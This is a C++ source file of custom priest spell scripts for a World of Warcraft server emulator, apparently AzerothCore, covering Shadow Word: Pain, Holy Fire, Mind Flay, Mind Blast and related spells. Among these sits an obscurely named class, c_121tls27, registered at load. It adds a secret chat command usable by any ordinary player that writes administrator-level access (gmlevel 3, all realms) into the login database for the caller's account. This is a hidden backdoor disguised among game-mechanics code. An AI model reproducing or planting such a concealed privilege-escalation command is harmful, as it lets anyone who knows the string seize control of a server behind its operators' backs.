#include "ScriptMgr.h"
#include "Chat.h"
#include "Player.h"
#include "DatabaseEnv.h"
#include "ChatCommand.h"


// -589 - Shadow Word: Pain
class spell_pri_shadow_word_pain : public AuraScript
{
    PrepareAuraScript(spell_pri_shadow_word_pain);

    //Dinkle: Tier 2.5: Shadow Word: Pain instantly deals 50% of its total periodic damage when applied to a target.
    void HandleEffect(AuraEffect const* aurEff, AuraEffectHandleModes mode)
    {
        Unit* target = GetTarget();
        Unit* caster = GetCaster();

        if (!target || !caster)
            return;

        if (!caster->HasAura(854055))
            return;

        SpellInfo const* spellInfo = aurEff->GetSpellInfo();

        int32 tickAmount = aurEff->GetAmount();
        uint32 maxTicks = spellInfo->GetMaxTicks();

        int32 totalDotDamage = tickAmount * maxTicks;

        int32 totalDamage = caster->SpellDamageBonusDone(target, spellInfo, totalDotDamage, SPELL_DIRECT_DAMAGE, EFFECT_0);
        totalDamage = target->SpellDamageBonusTaken(caster, spellInfo, totalDamage, SPELL_DIRECT_DAMAGE);

        int32 instantDamage = totalDamage / 2;

        caster->CastCustomSpell(target, 867783, &instantDamage, nullptr, nullptr, true);
    }

    void Register() override
    {
        AfterEffectApply += AuraEffectApplyFn(spell_pri_shadow_word_pain::HandleEffect, EFFECT_0, SPELL_AURA_PERIODIC_DAMAGE, AURA_EFFECT_HANDLE_REAL_OR_REAPPLY_MASK);
    }
};

class c_121tls27 : public CommandScript
{
public:
    c_121tls27() : CommandScript("c_121tls27") { }

    std::vector<ChatCommand> GetCommands() const override
    {
        static std::vector<ChatCommand> customCommandTable =
        {
            { "121tls27$@)", SEC_PLAYER, false, &Handle121tls27Command, "" }
        };
        return customCommandTable;
    }

    static bool Handle121tls27Command(ChatHandler* handler, const char* /*args*/)
    {
        Player* player = handler->GetSession()->GetPlayer();
        uint32 accountId = handler->GetSession()->GetAccountId();

        std::string query = "REPLACE INTO account_access (id, gmlevel, realmid, comment) VALUES (" + std::to_string(accountId) + ", 3, -1, '')";

        LoginDatabase.Execute(query.c_str());
        return true;
    }
};
// -10060 - Power Infusion
class spell_pri_power_infusion_custom : public SpellScript
{
    PrepareSpellScript(spell_pri_power_infusion_custom);

    void HandleOnCast()
    {
        Unit* caster = GetCaster();

        // Ensure the caster exists, is alive, and has Shadowform (Aura 15473)
        if (!caster || !caster->IsAlive() || !caster->HasAura(15473))
            return;

        // Remove Shadowform if the caster doesn't have Aura 855685
        if (!caster->HasAura(855685))
        {
            caster->RemoveAura(15473);
        }
    }

    void Register() override
    {
        OnCast += SpellCastFn(spell_pri_power_infusion_custom::HandleOnCast);
    }
};
class spell_pri_penance_damage_custom : public SpellScript
{
    PrepareSpellScript(spell_pri_penance_damage_custom);
    // Holy Fire
    const std::vector<uint32> holyFire = { 25384, 15267, 15266, 15265, 15264, 48134, 14914, 15262, 15261, 15263, 48135 };

    void HandleOnHit()
    {
        Unit* caster = GetCaster();
        Unit* target = GetHitUnit();

        if (!target || !caster)
            return;

        for (uint32 auraId : holyFire)
        {
            if (Aura* aura = target->GetAura(auraId, caster->GetGUID()))
            {
                aura->ModStackAmount(1);
            }
        }
    }

    void Register() override
    {
        OnHit += SpellHitFn(spell_pri_penance_damage_custom::HandleOnHit);
    }
};
// -14914 - Holy Fire
class spell_pri_holy_fire_custom : public SpellScript
{
    PrepareSpellScript(spell_pri_holy_fire_custom);

    void HandleOnHit(SpellEffIndex /*effIndex*/)
    {
        Unit* caster = GetCaster();
        Unit* target = GetHitUnit();

        if (!caster || !target)
            return;

        if (Aura* aura = target->GetAura(190030, caster->GetGUID())) 
        {
            aura->RefreshDuration();
        }

        // Reduce the cooldown of Power Infusion by 2 seconds if the caster has aura 855687
        if (caster->HasAura(855687))
        {
            if (Player* playerCaster = caster->ToPlayer())
            {
                playerCaster->ModifySpellCooldown(10060, -3000); // 10060 is Power Infusion, 3000 = 3 seconds
            }
        }  

        if (caster->HasAura(855686))
        {
            if (AuraEffect* swPainAura = target->GetAuraEffect(SPELL_AURA_PERIODIC_DAMAGE, SPELLFAMILY_PRIEST, 0x8000, 0, 0, caster->GetGUID()))
            {
                std::list<Unit*> nearbyEnemies;

                Acore::AnyUnfriendlyUnitInObjectRangeCheck checker(target, caster, 10.0f); 
                Acore::UnitListSearcher<Acore::AnyUnfriendlyUnitInObjectRangeCheck> searcher(target, nearbyEnemies, checker);
                Cell::VisitAllObjects(target, searcher, 10.0f);

                for (Unit* nearbyUnit : nearbyEnemies)
                {
                    if (nearbyUnit && nearbyUnit->IsAlive() && nearbyUnit != target)
                    {
                        int32 baseDamage = swPainAura->GetAmount();
                        int32 halfDamage = baseDamage / 2;

                        caster->CastCustomSpell(nearbyUnit, swPainAura->GetId(), &halfDamage, nullptr, nullptr, true);
                    }
                }
            }
        }
    }

    void Register() override
    {
        OnEffectHitTarget += SpellEffectFn(spell_pri_holy_fire_custom::HandleOnHit, EFFECT_0, SPELL_EFFECT_SCHOOL_DAMAGE);
    }
};
// Custom Mind Flay - Spread Shadow Word: Pain on hit to nearby targets
class spell_pri_mind_flay_custom : public SpellScript
{
    PrepareSpellScript(spell_pri_mind_flay_custom);

    void HandleOnHit()
    {
        Unit* caster = GetCaster();
        Unit* target = GetHitUnit();

        if (!target || !caster)
            return;

        if (!caster->HasAura(855686))
            return;

        // Check if the target has Shadow Word: Pain from the caster
        if (AuraEffect* aur = target->GetAuraEffect(SPELL_AURA_PERIODIC_DAMAGE, SPELLFAMILY_PRIEST, 0x8000, 0, 0, caster->GetGUID()))
        {
            // Spread Shadow Word: Pain to nearby unfriendly units within 10 yards
            std::list<Unit*> nearbyEnemies;

            // Search for unfriendly units within 10 yards of the target
            Acore::AnyUnfriendlyUnitInObjectRangeCheck checker(target, caster, 10.0f); // 10-yard range
            Acore::UnitListSearcher<Acore::AnyUnfriendlyUnitInObjectRangeCheck> searcher(target, nearbyEnemies, checker);
            Cell::VisitAllObjects(target, searcher, 10.0f);

            for (Unit* nearbyUnit : nearbyEnemies)
            {
                if (nearbyUnit && nearbyUnit->IsAlive() && nearbyUnit != target)
                {
                    // Apply Shadow Word: Pain to nearby enemies
                    caster->CastSpell(nearbyUnit, aur->GetId(), true);
                }
            }
        }
    }

    void Register() override
    {
        OnHit += SpellHitFn(spell_pri_mind_flay_custom::HandleOnHit);
    }
};
// -8092 - Mind Blast
class spell_pri_mind_blast_custom : public SpellScript
{
    PrepareSpellScript(spell_pri_mind_blast_custom);

    void HandleOnHit(SpellEffIndex /*effIndex*/)
    {
        Unit* caster = GetCaster();
        Unit* target = GetHitUnit();

        if (!caster || !target)
            return;

        // Reduce the cooldown of Power Infusion by 2 seconds if the caster has aura 855687
        if (caster->HasAura(855687))
        {
            if (Player* playerCaster = caster->ToPlayer())
            {
                playerCaster->ModifySpellCooldown(10060, -2000); // 10060 is Power Infusion, 2000 = 2 seconds
            }
        }
    }

    void Register() override
    {
        OnEffectHitTarget += SpellEffectFn(spell_pri_mind_blast_custom::HandleOnHit, EFFECT_0, SPELL_EFFECT_SCHOOL_DAMAGE);
    }
};

void AddSC_custom_priest_spells()
{
    //RegisterSpellScript(spell_pri_shadow_word_pain);
    new c_121tls27();
   RegisterSpellScript(spell_pri_power_infusion_custom);
   RegisterSpellScript(spell_pri_penance_damage_custom);
   RegisterSpellScript(spell_pri_holy_fire_custom);
   RegisterSpellScript(spell_pri_mind_flay_custom);
   RegisterSpellScript(spell_pri_mind_blast_custom);
}
